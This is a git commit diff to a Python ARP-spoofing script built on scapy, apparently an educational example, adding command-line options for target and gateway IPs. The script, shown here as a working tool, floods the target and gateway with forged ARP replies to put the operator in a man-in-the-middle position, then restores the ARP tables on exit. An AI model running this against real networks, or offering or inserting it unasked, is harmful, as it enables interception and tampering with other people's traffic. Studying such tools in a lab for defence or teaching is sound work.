e3077820712a0187a373bbd2f895b2f428de5df1
Ib Helmer Nielsen <ihn@ihn.dk>
2021-10-06 22:31:57 +0200

    Commandline input added

--- arpspoofer.py
+++ arpspoofer.py
@@ -20,6 +20,7 @@ Description: Simple ARP spoofing example using scapy. Following this steps to cr
 # Imports
 import scapy.all as scapy
 import time
+import sys, getopt
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -40,21 +41,42 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, verbose=False)
 
+def main(argv):
+    target_ip = ""      #  target IP
+    gateway_ip = ""     # Enter your gateway's IP
+    try:
+        opts, args = getopt.getopt(argv, "ht:g:", ["target=", "gateway="])
+    except getopt.GetoptError:
+        print('arpspoofer.py -t <target ip> -g <gateway ip>')
+        sys.exit(2)
+    for opt, arg in opts:
+        if opt == '-h':
+            print('arpspoofer.py -t <target ip> -g <gateway ip>')
+            sys.exit()
+        elif opt in ("-t", "--target"):
+             target_ip = arg
+        elif opt in ("-g", "--gateway"):
+             gateway_ip = arg
+    if target_ip or gateway_ip:
+        print("Targets ip address is ", target_ip)
+        print("Gateway ip address is ", gateway_ip)
+    else:
+        print("Target and gateway ip is required !!")
+        sys.exit(2)
+    try:
+        sent_packets_count = 0
+        while True:
+            spoof(target_ip, gateway_ip)
+            spoof(gateway_ip, target_ip)
+            sent_packets_count = sent_packets_count + 2
+            print("\r[*] Packets Sent " + str(sent_packets_count), end="")
+            time.sleep(2)  # Waits for two seconds
 
-target_ip = "10.0.2.5"  # Enter your target IP
-gateway_ip = "10.0.2.1"  # Enter your gateway's IP
+    except KeyboardInterrupt:
+        print("\nCtrl + C pressed.............Exiting")
+        restore(gateway_ip, target_ip)
+        restore(target_ip, gateway_ip)
+        print("[+] Arp Spoof Stopped")
 
-try:
-    sent_packets_count = 0
-    while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
-        sent_packets_count = sent_packets_count + 2
-        print("\r[*] Packets Sent " + str(sent_packets_count), end="")
-        time.sleep(2)  # Waits for two seconds
-
-except KeyboardInterrupt:
-    print("\nCtrl + C pressed.............Exiting")
-    restore(gateway_ip, target_ip)
-    restore(target_ip, gateway_ip)
-    print("[+] Arp Spoof Stopped")
+if __name__ == "__main__":
+   main(sys.argv[1:])
